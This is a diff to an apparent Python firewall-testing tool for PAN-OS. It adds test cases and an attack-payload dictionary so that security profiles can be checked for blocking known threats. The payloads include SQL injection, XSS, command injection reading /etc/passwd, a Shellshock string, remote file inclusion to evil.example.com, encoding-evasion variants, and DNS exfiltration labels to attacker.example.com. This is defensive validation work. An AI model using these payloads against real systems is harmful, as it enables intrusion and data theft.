@@ -10,6 +10,7 @@ import logging
 import os
 import socket
 import ssl
+import struct
 import subprocess
 import threading
 import time
@@ -35,6 +36,7 @@ class SecurityTestCase:
     description: str
     expected_action: str    # "block"
     panos_feature: str      # PAN-OS feature that should catch this
+    threat_id: str = ''     # PAN-OS Threat ID (e.g., "41000 — SQL Injection")
     # Custom pattern fields
     custom: bool = False
     payload: str = ''
@@ -53,6 +55,7 @@ class SecurityTestResult:
     response_code: int
     detail: str
     panos_feature: str
+    threat_id: str = ''
     timestamp: float = 0.0
     # Enriched fields
     description: str = ''
@@ -113,6 +116,36 @@ EXPECTED_BEHAVIOR = {
     'shellshock': 'Firewall Vulnerability Protection should detect Shellshock (CVE-2014-6271) pattern "() { :;}" in HTTP headers targeting Bash CGI handlers',
     'file_inclusion': 'Firewall should detect Remote File Inclusion (RFI) patterns with URL parameters pointing to external files (http://, ftp://) for remote code execution',
     'info_disclosure': 'Firewall should detect access attempts to common information disclosure paths (phpinfo.php, .env, .git/) that expose sensitive server configuration',
+    # SSL Decryption Validation
+    'ssl_sqli': 'Firewall SSL Decryption policy must decrypt this HTTPS session. Vulnerability Protection should then detect SQL injection in the decrypted payload. If this test FAILs, verify Decryption Policy and Decryption Profile are configured and applied to the security rule',
+    'ssl_xss': 'Firewall SSL Decryption must decrypt HTTPS traffic. Vulnerability Protection should detect XSS <script> tag in the decrypted request. FAIL indicates decryption is not active or profile is not attached',
+    'ssl_eicar': 'Firewall SSL Decryption must decrypt the HTTPS download. Anti-Virus should detect the EICAR test file in the decrypted stream. This is the definitive test for SSL decryption — if EICAR passes through HTTPS, decryption is not working',
+    'ssl_c2': 'Firewall SSL Decryption must decrypt HTTPS. Anti-Spyware should detect the C2 beacon callback pattern in the decrypted payload. FAIL means either decryption or Anti-Spyware profile is not active',
+    'ssl_cmdi': 'Firewall SSL Decryption must decrypt HTTPS. Vulnerability Protection should detect OS command injection in the decrypted request parameters',
+    # App-ID Validation
+    'appid_ssh_on_443': 'Firewall App-ID should identify SSH protocol on port 443 (normally HTTPS). If a policy blocks SSH regardless of port, the connection should be reset. PASS confirms App-ID identifies applications by behavior, not port',
+    'appid_http_on_8080': 'Firewall App-ID should identify HTTP (web-browsing) on a non-standard port. If policies allow web-browsing, the connection succeeds and App-ID correctly identified the application',
+    'appid_ftp_on_443': 'Firewall App-ID should identify FTP protocol on port 443. If a policy blocks FTP, the connection should be reset regardless of port. PASS confirms port-independent application identification',
+    'appid_dns_on_80': 'Firewall App-ID should identify DNS protocol sent over TCP port 80. If policies restrict DNS to port 53, the connection should be blocked. PASS confirms App-ID detects DNS regardless of port',
+    # Data Exfiltration / DLP
+    'exfil_credit_card': 'Firewall Data Filtering profile should detect credit card number patterns (Luhn-valid numbers) in the HTTP POST body and block the exfiltration attempt',
+    'exfil_ssn': 'Firewall Data Filtering profile should detect Social Security Number patterns (XXX-XX-XXXX) in the HTTP POST body and block the data exfiltration',
+    'exfil_bulk_data': 'Firewall Data Filtering profile should detect bulk PII data (mixed credit cards, SSNs, emails) in the HTTP POST body and block the exfiltration',
+    'exfil_dns_data': 'Firewall Anti-Spyware profile should detect data exfiltration via DNS subdomain encoding — hex-encoded data embedded in DNS query labels',
+    'exfil_http_headers': 'Firewall Data Filtering profile should detect sensitive data patterns (credit cards, SSNs) hidden in custom HTTP headers',
+    # Evasion Techniques
+    'evasion_double_encode': 'Firewall should normalize double-URL-encoded payloads (%2527 → %27 → \') and detect the underlying SQL injection. Requires URL decode normalization in Vulnerability Protection profile',
+    'evasion_null_byte': 'Firewall should detect path traversal even with null byte injection (%00) used to bypass file extension checks. Requires proper null byte handling in the IPS engine',
+    'evasion_chunked': 'Firewall should reassemble chunked Transfer-Encoding and detect SQL injection split across HTTP chunks. Requires HTTP protocol decoder to reassemble before signature matching',
+    'evasion_unicode': 'Firewall should decode Unicode escape sequences (\\u003c = <) and detect the underlying XSS attack. Requires Unicode normalization in the IPS engine',
+    'evasion_case_mixing': 'Firewall should perform case-insensitive matching and detect SQL injection keywords regardless of character case (SeLeCt, UnIoN). Standard IPS behavior',
+    'evasion_comment_insert': 'Firewall should detect SQL injection even with comment insertion (UN/**/ION) used to evade simple pattern matching. Requires SQL syntax-aware inspection',
+    # Expanded C2
+    'c2_cobalt_strike': 'Firewall Anti-Spyware profile should detect Cobalt Strike malleable C2 beacon patterns including characteristic URI paths, MSIE User-Agent, and encoded session cookies',
+    'c2_metasploit': 'Firewall Anti-Spyware should detect Metasploit reverse HTTP handler patterns including Trident User-Agent, short URI paths, and binary POST payloads',
+    'c2_dns_c2': 'Firewall Anti-Spyware should detect C2 communication over DNS TXT queries with encoded data in subdomain labels, characteristic of tools like dnscat2 and Cobalt Strike DNS beacon',
+    'c2_icmp_tunnel': 'Firewall Anti-Spyware or Zone Protection should detect data exfiltration over ICMP echo requests with oversized or encoded payloads, characteristic of tools like icmpsh and ptunnel',
+    'c2_http_beacon': 'Firewall Anti-Spyware should detect periodic HTTP beacon patterns with rotating User-Agents, encoded payloads, and consistent callback intervals characteristic of C2 frameworks',
 }
 
 # ─── Test Catalog ───────────────────────────────────────────
@@ -120,149 +153,241 @@ EXPECTED_BEHAVIOR = {
 WEB_ATTACK_TESTS = [
     SecurityTestCase('sqli_union', 'SQL Injection — UNION SELECT',
         'web_attacks', 'UNION-based SQL injection in URL query parameter. Sends a crafted SQL UNION SELECT statement that attempts to extract usernames and passwords from the database. This is one of the most common SQL injection techniques used to exfiltrate data.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection: UNION SELECT'),
     SecurityTestCase('sqli_or', 'SQL Injection — OR 1=1',
         'web_attacks', 'Boolean-based SQL injection via OR clause. Injects an always-true condition (OR 1=1) to bypass authentication or retrieve all records from a database table.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='41001 — SQL Injection: Boolean-Based'),
     SecurityTestCase('sqli_drop', 'SQL Injection — DROP TABLE',
         'web_attacks', 'Destructive SQL injection with DROP TABLE statement. Attempts to delete an entire database table, causing data loss and service disruption.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='41002 — SQL Injection: DROP Statement'),
     SecurityTestCase('xss_script', 'XSS — Script Tag',
         'web_attacks', 'Reflected XSS via <script> tag in URL parameter. Injects JavaScript code that executes in the victim\'s browser when the server reflects the payload back in the response.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='41501 — Cross-Site Scripting: Script Tag'),
     SecurityTestCase('xss_img', 'XSS — IMG onerror',
         'web_attacks', 'Reflected XSS via IMG tag with onerror handler. Uses a broken image tag to trigger JavaScript execution through the onerror event handler, bypassing basic script tag filters.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='41502 — Cross-Site Scripting: Event Handler'),
     SecurityTestCase('xss_svg', 'XSS — SVG onload',
         'web_attacks', 'Reflected XSS via SVG element with onload handler. Exploits SVG\'s onload event to execute JavaScript, a technique often used to bypass XSS filters.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='41503 — Cross-Site Scripting: SVG Element'),
     SecurityTestCase('cmdi_cat', 'Command Injection — cat /etc/passwd',
         'web_attacks', 'OS command injection reading sensitive file. Appends a semicolon and system command to read /etc/passwd, attempting to extract user account information from the server.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
     SecurityTestCase('cmdi_pipe', 'Command Injection — Pipe',
         'web_attacks', 'OS command injection using pipe operator. Uses the pipe (|) to chain a directory listing command, attempting to enumerate the server\'s file system.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
     SecurityTestCase('cmdi_backtick', 'Command Injection — Backtick',
         'web_attacks', 'OS command injection via backtick execution. Uses backtick syntax to execute the id command, revealing the server process\'s user identity and privileges.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='42001 — OS Command Injection'),
     SecurityTestCase('path_traversal', 'Path Traversal — ../../etc/passwd',
         'web_attacks', 'Directory traversal to read /etc/passwd. Uses relative path sequences (../) to escape the web root and access sensitive system files.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='42501 — Directory Traversal'),
     SecurityTestCase('log4shell', 'Log4Shell — JNDI Lookup',
         'web_attacks', 'Log4j RCE via JNDI lookup string in HTTP header (CVE-2021-44228). Sends the ${jndi:ldap://...} payload in HTTP headers, exploiting the Log4j vulnerability to trigger remote code execution.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='93054 — Apache Log4j RCE (CVE-2021-44228)'),
     SecurityTestCase('xxe', 'XXE — XML External Entity',
         'web_attacks', 'XML External Entity injection. Sends a crafted XML payload with a DOCTYPE declaration referencing an external entity (/etc/passwd), attempting server-side file disclosure.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='43001 — XML External Entity Injection'),
     SecurityTestCase('ssrf', 'SSRF — Server-Side Request Forgery',
         'web_attacks', 'Sends a request with a URL parameter pointing to an internal metadata endpoint (169.254.169.254), attempting to access cloud instance metadata or internal services.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='43501 — Server-Side Request Forgery'),
     SecurityTestCase('ssti', 'SSTI — Server-Side Template Injection',
         'web_attacks', 'Sends template expression payloads ({{7*7}}, ${7*7}) that execute on the server if improperly sandboxed. Tests detection of Jinja2/Twig/Freemarker injection patterns.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='44001 — Server-Side Template Injection'),
     SecurityTestCase('ldap_injection', 'LDAP Injection',
         'web_attacks', 'Injects LDAP filter metacharacters to modify directory queries. Sends payload with wildcard and boolean operators to extract or bypass LDAP authentication.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='44501 — LDAP Injection'),
     SecurityTestCase('xpath_injection', 'XPath Injection',
         'web_attacks', 'Injects XPath query syntax to manipulate XML data queries. Sends boolean-based XPath injection to bypass authentication or extract XML document data.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='44502 — XPath Injection'),
     SecurityTestCase('crlf_injection', 'CRLF / Header Injection',
         'web_attacks', 'Injects carriage return and line feed characters (%0d%0a) into HTTP headers to add arbitrary headers or split the response, enabling cache poisoning or XSS.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='45001 — HTTP Header Injection'),
     SecurityTestCase('open_redirect', 'Open Redirect',
         'web_attacks', 'Sends a request with a redirect parameter pointing to an external malicious site. Firewalls should detect URL redirect manipulation patterns.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='45501 — Open Redirect'),
     SecurityTestCase('blind_sqli', 'Blind SQL Injection — Time-Based',
         'web_attacks', 'Sends a time-based blind SQL injection payload using WAITFOR DELAY or SLEEP() to detect SQL injection vulnerabilities without direct output.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='41003 — SQL Injection: Time-Based Blind'),
     SecurityTestCase('deserialization', 'Insecure Deserialization',
         'web_attacks', 'Sends a serialized Java object payload (rO0AB...) in the request body, targeting insecure deserialization vulnerabilities in Java-based applications.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='46001 — Java Deserialization Attack'),
     SecurityTestCase('shellshock', 'Shellshock — CVE-2014-6271',
         'web_attacks', 'Sends the Shellshock (Bash bug) exploit payload in HTTP headers. The () { :;} pattern exploits CVE-2014-6271 to achieve remote code execution on vulnerable CGI servers.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='36729 — Shellshock Bash RCE (CVE-2014-6271)'),
     SecurityTestCase('file_inclusion', 'Remote File Inclusion (RFI)',
         'web_attacks', 'Sends a URL parameter referencing a remote PHP file for inclusion. If the server processes this, it could execute arbitrary remote code.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='46501 — Remote File Inclusion'),
     SecurityTestCase('info_disclosure', 'Information Disclosure — phpinfo',
         'web_attacks', 'Attempts to access common information disclosure paths (phpinfo.php, .env, .git/config) that expose sensitive server configuration and credentials.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='47001 — Information Disclosure'),
 ]
 
 MALWARE_TESTS = [
     SecurityTestCase('eicar_http', 'EICAR Download — HTTP',
         'malware_threats', 'Download EICAR anti-malware test file over HTTP (port 9999). The EICAR test string is a standardized 68-byte file recognized by all anti-virus products as a test threat. Downloaded over unencrypted HTTP for easy inspection.',
-        'block', 'Anti-Virus'),
+        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File'),
     SecurityTestCase('eicar_https', 'EICAR Download — HTTPS',
         'malware_threats', 'Download EICAR test file over HTTPS (port 443). Same EICAR file but over encrypted HTTPS. Firewall must have SSL Decryption policy enabled to inspect the encrypted payload and detect the threat.',
-        'block', 'Anti-Virus'),
+        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File (SSL)'),
     SecurityTestCase('eicar_zip', 'EICAR in ZIP — HTTP',
         'malware_threats', 'Download EICAR inside ZIP archive over HTTP. Tests whether the firewall can inspect compressed archives and detect threats inside ZIP files. Requires archive inspection to be enabled in the Anti-Virus profile.',
-        'block', 'Anti-Virus'),
+        'block', 'Anti-Virus', threat_id='275470248 — EICAR Test File (Archive)'),
     SecurityTestCase('c2_callback', 'C2 Callback Pattern',
         'malware_threats', 'HTTP POST with encoded data mimicking C2 beacon callback. Sends a base64-encoded payload with suspicious headers (old IE User-Agent, hex session cookie, suspicious X-Request-ID) that mimic command-and-control beacon traffic.',
-        'block', 'Anti-Spyware'),
+        'block', 'Anti-Spyware', threat_id='86500 — C2 Beacon Callback'),
     SecurityTestCase('malicious_ua', 'Malicious User-Agent',
         'malware_threats', 'HTTP request with known malware User-Agent string. Sends a request with "Wget/1.0 (CobaltStrike)" User-Agent, mimicking traffic from a well-known penetration testing/attack framework.',
-        'block', 'Anti-Spyware'),
+        'block', 'Anti-Spyware', threat_id='86501 — Suspicious User-Agent String'),
 ]
 
 URL_FILTERING_TESTS = [
     SecurityTestCase('url_malware', 'URL Category — Malware',
         'url_filtering', 'Access URL in PAN-DB malware category. Attempts to visit a URL that PAN-DB classifies as hosting malware. URL Filtering policy should block access to this category.',
-        'block', 'URL Filtering'),
+        'block', 'URL Filtering', threat_id='PAN-DB: malware'),
     SecurityTestCase('url_phishing', 'URL Category — Phishing',
         'url_filtering', 'Access URL in PAN-DB phishing category. Attempts to visit a URL classified as a phishing site. URL Filtering should block access to prevent credential theft.',
-        'block', 'URL Filtering'),
+        'block', 'URL Filtering', threat_id='PAN-DB: phishing'),
     SecurityTestCase('url_hacking', 'URL Category — Hacking',
         'url_filtering', 'Access URL in PAN-DB hacking category. Attempts to visit a URL categorized as hacking/computer security tools. URL Filtering should block based on policy.',
-        'block', 'URL Filtering'),
+        'block', 'URL Filtering', threat_id='PAN-DB: hacking'),
     SecurityTestCase('url_proxy', 'URL Category — Proxy/Anonymizer',
         'url_filtering', 'Access URL in PAN-DB proxy-avoidance category. Attempts to visit a proxy/anonymizer site used to bypass security controls. URL Filtering should block to prevent policy evasion.',
-        'block', 'URL Filtering'),
+        'block', 'URL Filtering', threat_id='PAN-DB: proxy-avoidance'),
 ]
 
 DNS_ATTACK_TESTS = [
     SecurityTestCase('dns_tunnel', 'DNS Tunneling Detection',
         'dns_attacks', 'Sends DNS queries with suspiciously long subdomain labels containing base64-encoded data, mimicking DNS tunneling tools like iodine or dnscat2. The firewall Anti-Spyware profile should detect anomalous DNS query patterns.',
-        'block', 'Anti-Spyware'),
+        'block', 'Anti-Spyware', threat_id='86600 — Suspicious DNS Query (Tunneling)'),
     SecurityTestCase('dns_dga', 'DGA Domain Detection',
         'dns_attacks', 'Queries multiple algorithmically-generated domain names that mimic Domain Generation Algorithm (DGA) patterns used by malware botnets. The firewall should detect the entropy and pattern of DGA domains.',
-        'block', 'Anti-Spyware'),
+        'block', 'Anti-Spyware', threat_id='86601 — DGA Domain Query'),
     SecurityTestCase('dns_rebind', 'DNS Rebinding Attempt',
         'dns_attacks', 'Queries domains that could be used in DNS rebinding attacks, where a domain alternates between external and private IP addresses to bypass same-origin policy and access internal resources.',
-        'block', 'Anti-Spyware'),
+        'block', 'Anti-Spyware', threat_id='86602 — DNS Rebinding Attempt'),
 ]
 
 PROTOCOL_ABUSE_TESTS = [
     SecurityTestCase('ssh_bruteforce', 'SSH Brute Force Pattern',
         'protocol_abuse', 'Performs rapid successive SSH login attempts with different credentials, simulating a brute-force attack. The firewall should detect the high rate of failed authentication attempts and trigger a brute-force protection signature.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='40015 — SSH Brute Force'),
     SecurityTestCase('ftp_bounce', 'FTP Bounce Scan',
         'protocol_abuse', 'Attempts to use FTP PORT command to redirect data connections to internal IP addresses, simulating an FTP bounce scan used for internal network reconnaissance.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='30003 — FTP Bounce Scan'),
     SecurityTestCase('http_smuggle', 'HTTP Request Smuggling',
         'protocol_abuse', 'Sends an HTTP request with ambiguous Content-Length and Transfer-Encoding headers to exploit parsing differences between firewall and server, potentially smuggling malicious requests.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='41600 — HTTP Request Smuggling'),
     SecurityTestCase('slowloris', 'Slowloris DoS Pattern',
         'protocol_abuse', 'Opens an HTTP connection and sends partial headers very slowly, keeping the connection alive without completing the request. This Slowloris-style pattern should be detected by the firewall as a denial-of-service attempt.',
-        'block', 'Vulnerability Protection'),
+        'block', 'Vulnerability Protection', threat_id='40039 — Slowloris DoS Attack'),
 ]
 
 FILE_THREAT_TESTS = [
     SecurityTestCase('pdf_js', 'PDF with Embedded JavaScript',
         'file_threats', 'Downloads a PDF file containing embedded JavaScript (app.alert action). The firewall Anti-Virus or file blocking profile should detect and block PDFs with active content as they are commonly used for exploitation.',
-        'block', 'Anti-Virus'),
+        'block', 'Anti-Virus', threat_id='52001 — PDF with JavaScript'),
     SecurityTestCase('office_macro', 'Office Document with VBA Macro',
         'file_threats', 'Downloads a file with OLE2 compound document header and VBA macro signatures (AutoOpen). The firewall should detect and block files containing macro code, as they are a primary vector for malware delivery.',
-        'block', 'Anti-Virus'),
+        'block', 'Anti-Virus', threat_id='52002 — Office Macro Document'),
     SecurityTestCase('pe_download', 'PE Executable Download — HTTP',
         'file_threats', 'Downloads a Windows PE executable file (MZ/PE header) over HTTP. The firewall file blocking or Anti-Virus profile should detect the executable file type and block the download based on policy.',
-        'block', 'Anti-Virus'),
+        'block', 'Anti-Virus', threat_id='File Blocking: PE executable'),
 ]
 
-ALL_TESTS = (WEB_ATTACK_TESTS + MALWARE_TESTS + URL_FILTERING_TESTS +
-             DNS_ATTACK_TESTS + PROTOCOL_ABUSE_TESTS + FILE_THREAT_TESTS)
+SSL_DECRYPTION_TESTS = [
+    SecurityTestCase('ssl_sqli', 'SQL Injection over HTTPS',
+        'ssl_decryption', 'Sends SQL injection payload over HTTPS. If the firewall is decrypting SSL, Vulnerability Protection will detect and block the attack in the decrypted stream. If this passes through, SSL decryption is likely not enabled.',
+        'block', 'SSL Decryption + Vulnerability Protection', threat_id='41000 — SQL Injection (SSL)'),
+    SecurityTestCase('ssl_xss', 'XSS over HTTPS',
+        'ssl_decryption', 'Sends Cross-Site Scripting payload over HTTPS. Requires SSL decryption to inspect the encrypted payload and detect the <script> tag.',
+        'block', 'SSL Decryption + Vulnerability Protection', threat_id='41501 — Cross-Site Scripting (SSL)'),
+    SecurityTestCase('ssl_eicar', 'EICAR Download over HTTPS',
+        'ssl_decryption', 'Downloads the EICAR anti-malware test file over HTTPS. This is the definitive SSL decryption test — the firewall must decrypt the HTTPS session to detect the EICAR signature in the response body.',
+        'block', 'SSL Decryption + Anti-Virus', threat_id='275470248 — EICAR Test File (SSL Decryption)'),
+    SecurityTestCase('ssl_c2', 'C2 Callback over HTTPS',
+        'ssl_decryption', 'Sends C2 beacon callback pattern over HTTPS with base64-encoded payload and suspicious headers. Anti-Spyware must inspect the decrypted stream to detect the C2 pattern.',
+        'block', 'SSL Decryption + Anti-Spyware', threat_id='86500 — C2 Beacon (SSL)'),
+    SecurityTestCase('ssl_cmdi', 'Command Injection over HTTPS',
+        'ssl_decryption', 'Sends OS command injection payload over HTTPS. Vulnerability Protection must inspect the decrypted request to detect the injection pattern.',
+        'block', 'SSL Decryption + Vulnerability Protection', threat_id='42001 — OS Command Injection (SSL)'),
+]
+
+APPID_VALIDATION_TESTS = [
+    SecurityTestCase('appid_ssh_on_443', 'SSH Traffic on HTTPS Port (443)',
+        'appid_validation', 'Sends SSH protocol banner on port 443 (normally HTTPS). Firewall App-ID should identify the traffic as SSH regardless of port and enforce application-based policy.',
+        'block', 'App-ID', threat_id='App-ID: SSH on port 443'),
+    SecurityTestCase('appid_http_on_8080', 'HTTP on Non-Standard Port (8082)',
+        'appid_validation', 'Sends standard HTTP request on port 8082. Firewall App-ID should identify it as web-browsing regardless of port number.',
+        'block', 'App-ID', threat_id='App-ID: web-browsing'),
+    SecurityTestCase('appid_ftp_on_443', 'FTP Traffic on HTTPS Port (443)',
+        'appid_validation', 'Sends FTP protocol commands on port 443. Firewall App-ID should identify the traffic as FTP, not HTTPS, and enforce FTP-specific policies.',
+        'block', 'App-ID', threat_id='App-ID: FTP on port 443'),
+    SecurityTestCase('appid_dns_on_80', 'DNS Query on HTTP Port (80)',
+        'appid_validation', 'Sends a DNS A query over TCP port 80. Firewall App-ID should identify the traffic as DNS protocol regardless of the port and apply DNS-specific policies.',
+        'block', 'App-ID', threat_id='App-ID: DNS on port 80'),
+]
+
+DATA_EXFILTRATION_TESTS = [
+    SecurityTestCase('exfil_credit_card', 'Credit Card Number Exfiltration',
+        'data_exfiltration', 'POSTs multiple Luhn-valid credit card numbers (Visa, Mastercard, Amex) to an external server. Data Filtering profile should detect credit card patterns and block the exfiltration.',
+        'block', 'Data Filtering', threat_id='Data Filtering: Credit Card Numbers'),
+    SecurityTestCase('exfil_ssn', 'Social Security Number Exfiltration',
+        'data_exfiltration', 'POSTs Social Security Numbers in XXX-XX-XXXX format to an external server. Data Filtering profile should detect SSN patterns and block the data leak.',
+        'block', 'Data Filtering', threat_id='Data Filtering: SSN'),
+    SecurityTestCase('exfil_bulk_data', 'Bulk PII Data Exfiltration',
+        'data_exfiltration', 'POSTs a large payload containing mixed PII — credit cards, SSNs, email addresses, phone numbers. Tests Data Filtering detection threshold for bulk sensitive data.',
+        'block', 'Data Filtering', threat_id='Data Filtering: Bulk PII'),
+    SecurityTestCase('exfil_dns_data', 'DNS-Based Data Exfiltration',
+        'data_exfiltration', 'Encodes sensitive data as hex in DNS subdomain queries (e.g., 4111111111111111.exfil.attacker.com). Anti-Spyware should detect DNS exfiltration patterns.',
+        'block', 'Anti-Spyware', threat_id='86600 — DNS Data Exfiltration'),
+    SecurityTestCase('exfil_http_headers', 'Header-Based Data Exfiltration',
+        'data_exfiltration', 'Hides sensitive data (credit cards, SSNs) in custom HTTP headers (X-Session-Data, X-Debug-Info). Tests whether Data Filtering inspects headers, not just body.',
+        'block', 'Data Filtering', threat_id='Data Filtering: Header Exfil'),
+]
+
+EVASION_TECHNIQUE_TESTS = [
+    SecurityTestCase('evasion_double_encode', 'Double URL Encoding Evasion',
+        'evasion_techniques', 'SQL injection payload with double URL encoding (%2527 instead of %27). Tests whether the firewall performs recursive URL decoding before signature matching.',
+        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Double Encoded)'),
+    SecurityTestCase('evasion_null_byte', 'Null Byte Injection Evasion',
+        'evasion_techniques', 'Path traversal with null byte (%00) appended to bypass file extension checks (../../etc/passwd%00.jpg). Tests null byte handling in the IPS engine.',
+        'block', 'Vulnerability Protection', threat_id='42501 — Directory Traversal (Null Byte)'),
+    SecurityTestCase('evasion_chunked', 'Chunked Transfer Encoding Evasion',
+        'evasion_techniques', 'SQL injection payload split across multiple HTTP chunks using Transfer-Encoding: chunked. Tests whether the firewall reassembles chunks before inspection.',
+        'block', 'Vulnerability Protection', threat_id='41600 — HTTP Evasion (Chunked)'),
+    SecurityTestCase('evasion_unicode', 'Unicode Escape Evasion',
+        'evasion_techniques', 'XSS payload using Unicode escape sequences (\\u003cscript\\u003e instead of <script>). Tests Unicode normalization in the IPS engine.',
+        'block', 'Vulnerability Protection', threat_id='41501 — XSS (Unicode Encoded)'),
+    SecurityTestCase('evasion_case_mixing', 'Case Randomization Evasion',
+        'evasion_techniques', 'SQL injection with randomized character case (SeLeCt, UnIoN). Tests case-insensitive signature matching in Vulnerability Protection.',
+        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Case Mixed)'),
+    SecurityTestCase('evasion_comment_insert', 'SQL Comment Insertion Evasion',
+        'evasion_techniques', 'SQL injection with inline comments between keywords (UN/**/ION SE/**/LECT). Tests whether the firewall strips SQL comments before matching.',
+        'block', 'Vulnerability Protection', threat_id='41000 — SQL Injection (Comment Insertion)'),
+]
+
+C2_EXPANDED_TESTS = [
+    SecurityTestCase('c2_cobalt_strike', 'Cobalt Strike Beacon',
+        'malware_threats', 'Simulates Cobalt Strike malleable C2 beacon callback with characteristic URI pattern (/submit.php), MSIE User-Agent, and base64-encoded session cookie.',
+        'block', 'Anti-Spyware', threat_id='86502 — Cobalt Strike C2 Beacon'),
+    SecurityTestCase('c2_metasploit', 'Metasploit Reverse HTTP',
+        'malware_threats', 'Simulates Metasploit reverse HTTP handler with short randomized URI path, Trident User-Agent, and binary POST payload (PE-like header).',
+        'block', 'Anti-Spyware', threat_id='86503 — Metasploit Reverse HTTP'),
+    SecurityTestCase('c2_dns_c2', 'DNS C2 Channel',
+        'malware_threats', 'Sends DNS TXT queries with encoded C2 data in subdomain labels, simulating tools like dnscat2 or Cobalt Strike DNS beacon.',
+        'block', 'Anti-Spyware', threat_id='86504 — DNS C2 Communication'),
+    SecurityTestCase('c2_icmp_tunnel', 'ICMP Data Tunnel',
+        'malware_threats', 'Sends ICMP echo requests with encoded data payloads using hping3, simulating ICMP-based tunneling tools like icmpsh or ptunnel.',
+        'block', 'Anti-Spyware', threat_id='86505 — ICMP Tunnel'),
+    SecurityTestCase('c2_http_beacon', 'HTTP Beacon with Jitter',
+        'malware_threats', 'Sends periodic HTTP POST callbacks with rotating User-Agents, encoded payloads, and beacon sequence headers, simulating C2 framework behavior.',
+        'block', 'Anti-Spyware', threat_id='86506 — HTTP C2 Beacon'),
+]
+
+ALL_TESTS = (WEB_ATTACK_TESTS + MALWARE_TESTS + C2_EXPANDED_TESTS +
+             URL_FILTERING_TESTS + DNS_ATTACK_TESTS + PROTOCOL_ABUSE_TESTS +
+             FILE_THREAT_TESTS + SSL_DECRYPTION_TESTS + APPID_VALIDATION_TESTS +
+             DATA_EXFILTRATION_TESTS + EVASION_TECHNIQUE_TESTS)
 TEST_MAP = {t.id: t for t in ALL_TESTS}
 
 # Default URL Filtering test URLs (configurable at runtime)
@@ -325,6 +450,36 @@ ATTACK_PAYLOADS = {
     'shellshock': '() { :;}; /bin/cat /etc/passwd',
     'file_inclusion': 'http://evil.example.com/shell.txt%00',
     'info_disclosure': 'phpinfo.php|.env|.git/config|wp-config.php.bak|server-status',
+    # SSL Decryption — reuse same payloads, sent over HTTPS
+    'ssl_sqli': "' UNION SELECT username,password FROM users--",
+    'ssl_xss': '<script>alert("XSS")</script>',
+    'ssl_eicar': '/eicar',
+    'ssl_c2': 'eyJjb21tYW5kIjoiYmVhY29uIiwiaWQiOiIxMjM0NTY3ODkwIn0=',
+    'ssl_cmdi': '; cat /etc/passwd',
+    # App-ID Validation — protocol identification strings
+    'appid_ssh_on_443': 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n',
+    'appid_http_on_8080': 'GET / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n',
+    'appid_ftp_on_443': 'USER anonymous\r\n',
+    'appid_dns_on_80': 'dns-a-query:example.com',
+    # Data Exfiltration — sensitive data patterns
+    'exfil_credit_card': 'Transaction ID: TXN-29571\nCard: 4111111111111111\nCard: 5500000000000004\nCard: 340000000000009\nCard: 6011000000000004\nAmount: $4,299.00\nStatus: approved',
+    'exfil_ssn': 'Employee Records Export\nJohn Smith, SSN: 123-45-6789, DOB: 1985-03-15\nJane Doe, SSN: 987-65-4321, DOB: 1990-07-22\nBob Wilson, SSN: 456-78-9012, DOB: 1978-11-30',
+    'exfil_bulk_data': 'CONFIDENTIAL - Employee Data Dump\nCC: 4111111111111111, SSN: 123-45-6789, email: admin@corp.com, phone: 555-0100\nCC: 5500000000000004, SSN: 987-65-4321, email: cfo@corp.com, phone: 555-0101\nCC: 340000000000009, SSN: 456-78-9012, email: hr@corp.com, phone: 555-0102\nCC: 6011000000000004, SSN: 111-22-3333, email: ceo@corp.com, phone: 555-0103',
+    'exfil_dns_data': '34313131313131313131313131.exfil.attacker.example.com|353530303030303030303030.leak.attacker.example.com|3132332d34352d36373839.data.attacker.example.com',
+    'exfil_http_headers': '4111111111111111|123-45-6789|admin@corp.com',
+    # Evasion Techniques — encoded/obfuscated attack payloads
+    'evasion_double_encode': '%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--',
+    'evasion_null_byte': '../../../../etc/passwd%00.jpg',
+    'evasion_chunked': "' UNION SELECT username,password FROM users--",
+    'evasion_unicode': '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e',
